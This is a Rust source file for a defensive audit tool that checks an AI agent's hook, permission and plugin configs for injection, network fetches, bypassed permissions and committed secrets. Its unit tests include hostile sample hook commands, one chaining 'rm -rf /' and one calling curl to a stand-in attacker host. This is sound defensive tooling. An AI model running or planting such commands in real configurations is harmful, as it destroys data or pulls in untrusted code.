//! Purpose: AgentShield-style security audit of claude-core's OWN config surface
//!   — hooks, settings/permissions, and the plugin manifest — for injection
//!   vectors, over-broad permissions, secrets, and misconfiguration.
//! Caller: commands.rs `config-audit` dispatch.
//! Dependencies: std::fs, std::path, serde_json, crate::args, crate::json, crate::runtime.
//! Main Functions: run_config_audit_command, audit_hooks_doc, audit_settings_doc, audit_manifest_doc.
//! Side Effects: Reads config files under the repo and/or Claude home; writes a report.
//!
//! Why this exists: the security-and-compliance-auditor skill audits the USER's
//! code. Nothing audited the agent's own configuration — the hooks, permission
//! rules, and manifest that shape what the agent is allowed to do. A
//! prompt-injected or over-broad config is an attack surface distinct from
//! application code. This is the deterministic, rule-based half of an
//! adversarial config audit (the model-driven red-team half stays a skill).
//!
//! Design: each surface has a pure `audit_*_doc(&JsonValue, &mut Vec<Finding>)`
//! rule function and a thin file-reading wrapper. Production and tests both call
//! the pure function, so the rule logic is tested directly with no duplication.

use std::fs;
use std::io::Write;
use std::path::Path;

use serde_json::Value as JsonValue;

use crate::args::FlagSet;
use crate::json::{write_indented, Value};
use crate::runtime::resolve_repository_root;

/// One audit finding. Severity drives the exit code: any `high` fails the audit.
#[derive(Debug, Clone)]
struct Finding {
    severity: Severity,
    surface: String,
    message: String,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum Severity {
    High,
    Medium,
    Low,
}

impl Severity {
    fn label(self) -> &'static str {
        match self {
            Severity::High => "high",
            Severity::Medium => "medium",
            Severity::Low => "low",
        }
    }
}

pub fn run_config_audit_command(
    arguments: &[String],
    standard_output: &mut dyn Write,
    standard_error: &mut dyn Write,
) -> u8 {
    let mut flag_set = FlagSet::new("config-audit");
    flag_set.string_flag("repo-root", "");
    flag_set.bool_flag("json", false);
    if let Err(parse_error) = flag_set.parse(arguments) {
        let _ = writeln!(standard_error, "{}", parse_error.message);
        return 1;
    }
    let repository_root = match resolve_repository_root(flag_set.string_value("repo-root")) {
        Ok(path) => path,
        Err(error) => {
            let _ = writeln!(standard_error, "config-audit: {error}");
            return 1;
        }
    };

    let mut findings = Vec::new();
    if let Some(document) = read_json(&repository_root.join(".claude").join("hooks.json")) {
        audit_hooks_doc(&document, &mut findings);
    }
    if let Some(document) = read_json(&repository_root.join(".claude").join("settings.json")) {
        audit_settings_doc(&document, &mut findings);
    }
    audit_local_settings_tracking(&repository_root, &mut findings);
    if let Some(document) = read_json(&repository_root.join(".claude-plugin").join("plugin.json")) {
        audit_manifest_doc(&document, &mut findings);
    }

    let high = findings
        .iter()
        .filter(|finding| finding.severity == Severity::High)
        .count();
    let medium = findings
        .iter()
        .filter(|finding| finding.severity == Severity::Medium)
        .count();
    let low = findings
        .iter()
        .filter(|finding| finding.severity == Severity::Low)
        .count();

    if flag_set.bool_value("json") {
        let payload = Value::Object(vec![
            ("high".into(), Value::Number(high.to_string())),
            ("medium".into(), Value::Number(medium.to_string())),
            ("low".into(), Value::Number(low.to_string())),
            (
                "findings".into(),
                Value::Array(findings.iter().map(finding_to_value).collect()),
            ),
        ]);
        if write_indented(standard_output, &payload).is_err() {
            return 1;
        }
        return if high > 0 { 2 } else { 0 };
    }

    let _ = writeln!(
        standard_output,
        "config-audit: {high} high, {medium} medium, {low} low finding(s)"
    );
    if findings.is_empty() {
        let _ = writeln!(
            standard_output,
            "  no findings — hooks, permissions, and manifest look clean"
        );
        return 0;
    }
    for finding in &findings {
        let _ = writeln!(
            standard_output,
            "  [{}] {}: {}",
            finding.severity.label(),
            finding.surface,
            finding.message
        );
    }
    // Fail closed only on high-severity findings so the audit can gate a release
    // without blocking on advisory medium/low notes.
    if high > 0 {
        2
    } else {
        0
    }
}

fn finding_to_value(finding: &Finding) -> Value {
    Value::Object(vec![
        (
            "severity".into(),
            Value::String(finding.severity.label().to_string()),
        ),
        ("surface".into(), Value::String(finding.surface.clone())),
        ("message".into(), Value::String(finding.message.clone())),
    ])
}

/// Audit a `hooks.json` document. Hook commands are arbitrary shell the agent
/// runs, so shell metacharacters (injection), network fetches (exfiltration),
/// and non-managed commands are flagged.
fn audit_hooks_doc(document: &JsonValue, findings: &mut Vec<Finding>) {
    let Some(hooks) = document.get("hooks").and_then(JsonValue::as_object) else {
        return;
    };
    for (event_name, entries) in hooks {
        let Some(entries) = entries.as_array() else {
            continue;
        };
        for entry in entries {
            let Some(commands) = entry.get("hooks").and_then(JsonValue::as_array) else {
                continue;
            };
            for command_entry in commands {
                let command = command_entry
                    .get("command")
                    .and_then(JsonValue::as_str)
                    .unwrap_or_default();
                if contains_shell_metacharacters(command) {
                    findings.push(Finding {
                        severity: Severity::High,
                        surface: format!("hooks.json:{event_name}"),
                        message: format!(
                            "hook command contains shell metacharacters (injection risk): {command}"
                        ),
                    });
                }
                if command.contains("curl") || command.contains("wget") {
                    findings.push(Finding {
                        severity: Severity::High,
                        surface: format!("hooks.json:{event_name}"),
                        message:
                            "hook command fetches from the network — exfiltration/supply-chain risk"
                                .to_string(),
                    });
                }
                if !command.is_empty() && !command.to_ascii_lowercase().contains("claude-skills") {
                    findings.push(Finding {
                        severity: Severity::Medium,
                        surface: format!("hooks.json:{event_name}"),
                        message: format!(
                            "hook command is not a managed claude-skills invocation: {command}"
                        ),
                    });
                }
            }
        }
    }
}

/// Audit a `settings.json` document for over-broad or dangerous permission grants.
fn audit_settings_doc(document: &JsonValue, findings: &mut Vec<Finding>) {
    let default_mode = document
        .get("permissions")
        .and_then(|permissions| permissions.get("defaultMode"))
        .and_then(JsonValue::as_str)
        .unwrap_or_default();
    if default_mode == "bypassPermissions" {
        findings.push(Finding {
            severity: Severity::High,
            surface: "settings.json:permissions.defaultMode".to_string(),
            message:
                "defaultMode is `bypassPermissions` — the agent runs tools without confirmation"
                    .to_string(),
        });
    }
    if let Some(allow) = document
        .get("permissions")
        .and_then(|permissions| permissions.get("allow"))
        .and_then(JsonValue::as_array)
    {
        for rule in allow {
            let rule_text = rule.as_str().unwrap_or_default();
            if rule_text == "Bash" || rule_text == "Bash(*)" || rule_text == "Bash(*:*)" {
                findings.push(Finding {
                    severity: Severity::High,
                    surface: "settings.json:permissions.allow".to_string(),
                    message: format!(
                        "unscoped Bash allow rule grants arbitrary command execution: {rule_text}"
                    ),
                });
            }
        }
    }
}

/// Audit a plugin manifest document for MCP server env values that look like
/// committed secret literals.
fn audit_manifest_doc(document: &JsonValue, findings: &mut Vec<Finding>) {
    let Some(servers) = document.get("mcpServers").and_then(JsonValue::as_object) else {
        return;
    };
    for (server_name, server) in servers {
        let Some(env) = server.get("env").and_then(JsonValue::as_object) else {
            continue;
        };
        for (key, value) in env {
            let value_text = value.as_str().unwrap_or_default();
            if looks_like_secret_literal(value_text) {
                findings.push(Finding {
                    severity: Severity::High,
                    surface: format!("plugin.json:mcpServers.{server_name}.env.{key}"),
                    message: "MCP server env value looks like a committed secret literal"
                        .to_string(),
                });
            }
        }
    }
}

/// A committed `settings.local.json` is a hygiene smell: it is per-developer and
/// should be gitignored. Flag (low) if it is tracked by git.
fn audit_local_settings_tracking(repository_root: &Path, findings: &mut Vec<Finding>) {
    let local_path = repository_root.join(".claude").join("settings.local.json");
    if local_path.is_file() && path_is_git_tracked(repository_root, ".claude/settings.local.json") {
        findings.push(Finding {
            severity: Severity::Low,
            surface: "settings.local.json".to_string(),
            message: "settings.local.json is git-tracked — local overrides should be gitignored"
                .to_string(),
        });
    }
}

fn contains_shell_metacharacters(command: &str) -> bool {
    // Managed hook commands are bare argv (`claude-skills hook <slug>`); pipes,
    // substitutions, redirects, and chaining indicate a hand-rolled shell hook.
    command.contains("&&")
        || command.contains("||")
        || command.contains('|')
        || command.contains(';')
        || command.contains('`')
        || command.contains("$(")
        || command.contains('>')
        || command.contains('<')
}

fn looks_like_secret_literal(value: &str) -> bool {
    // Env values that reference another variable (`${FOO}`/`$FOO`) or are empty
    // are fine. A long opaque token, or known key prefixes, are suspicious.
    if value.is_empty() || value.contains('$') {
        return false;
    }
    let upper = value.to_ascii_uppercase();
    let prefixed = ["AKIA", "SK-", "GHP_", "XOXB-", "-----BEGIN"]
        .iter()
        .any(|prefix| upper.starts_with(prefix));
    let long_token = value.len() >= 32
        && value
            .chars()
            .filter(|character| character.is_ascii_alphanumeric())
            .count()
            >= 28;
    prefixed || long_token
}

fn read_json(path: &Path) -> Option<JsonValue> {
    let text = fs::read_to_string(path).ok()?;
    serde_json::from_str(&text).ok()
}

/// Best-effort git-tracked check. Returns false when git is unavailable so the
/// audit never errors on a non-git checkout.
fn path_is_git_tracked(repository_root: &Path, relative_path: &str) -> bool {
    crate::runtime::run_command(
        "git",
        &[
            "ls-files".to_string(),
            "--error-unmatch".to_string(),
            relative_path.to_string(),
        ],
        Some(repository_root),
    )
    .map(|result| result.code == 0)
    .unwrap_or(false)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn clean_managed_hook_produces_no_findings() {
        let mut findings = Vec::new();
        let doc: JsonValue = serde_json::from_str(
            r#"{"hooks":{"PreToolUse":[{"matcher":"Bash","hooks":[{"type":"command","command":"claude-skills hook pre-tool-use"}]}]}}"#,
        )
        .unwrap();
        audit_hooks_doc(&doc, &mut findings);
        assert!(findings.is_empty(), "findings: {findings:?}");
    }

    #[test]
    fn shell_metacharacter_hook_is_high_severity() {
        let mut findings = Vec::new();
        let doc: JsonValue = serde_json::from_str(
            r#"{"hooks":{"PreToolUse":[{"matcher":"Bash","hooks":[{"type":"command","command":"claude-skills hook pre-tool-use && rm -rf /"}]}]}}"#,
        )
        .unwrap();
        audit_hooks_doc(&doc, &mut findings);
        assert!(findings
            .iter()
            .any(|f| f.severity == Severity::High && f.message.contains("shell metacharacters")));
    }

    #[test]
    fn network_fetch_hook_is_high_severity() {
        let mut findings = Vec::new();
        let doc: JsonValue = serde_json::from_str(
            r#"{"hooks":{"SessionStart":[{"matcher":"","hooks":[{"type":"command","command":"curl http://evil.example/x"}]}]}}"#,
        )
        .unwrap();
        audit_hooks_doc(&doc, &mut findings);
        assert!(findings.iter().any(|f| f.severity == Severity::High));
    }

    #[test]
    fn bypass_permissions_mode_is_high_severity() {
        let mut findings = Vec::new();
        let doc: JsonValue =
            serde_json::from_str(r#"{"permissions":{"defaultMode":"bypassPermissions"}}"#).unwrap();
        audit_settings_doc(&doc, &mut findings);
        assert!(findings
            .iter()
            .any(|f| f.severity == Severity::High && f.message.contains("bypassPermissions")));
    }

    #[test]
    fn unscoped_bash_allow_is_high_severity() {
        let mut findings = Vec::new();
        let doc: JsonValue = serde_json::from_str(r#"{"permissions":{"allow":["Bash"]}}"#).unwrap();
        audit_settings_doc(&doc, &mut findings);
        assert!(findings
            .iter()
            .any(|f| f.severity == Severity::High && f.message.contains("arbitrary command")));
    }

    #[test]
    fn scoped_bash_allow_is_clean() {
        let mut findings = Vec::new();
        let doc: JsonValue =
            serde_json::from_str(r#"{"permissions":{"allow":["Bash(git diff:*)"]}}"#).unwrap();
        audit_settings_doc(&doc, &mut findings);
        assert!(findings.is_empty(), "findings: {findings:?}");
    }

    #[test]
    fn mcp_env_secret_literal_is_high_severity() {
        let mut findings = Vec::new();
        let doc: JsonValue = serde_json::from_str(
            r#"{"mcpServers":{"x":{"env":{"TOKEN":"AKIAIOSFODNN7EXAMPLEKEY12345678"}}}}"#,
        )
        .unwrap();
        audit_manifest_doc(&doc, &mut findings);
        assert!(findings.iter().any(|f| f.severity == Severity::High));
    }

    #[test]
    fn mcp_env_var_reference_is_clean() {
        let mut findings = Vec::new();
        let doc: JsonValue =
            serde_json::from_str(r#"{"mcpServers":{"x":{"env":{"TOKEN":"${MY_TOKEN}"}}}}"#)
                .unwrap();
        audit_manifest_doc(&doc, &mut findings);
        assert!(findings.is_empty(), "findings: {findings:?}");
    }
}
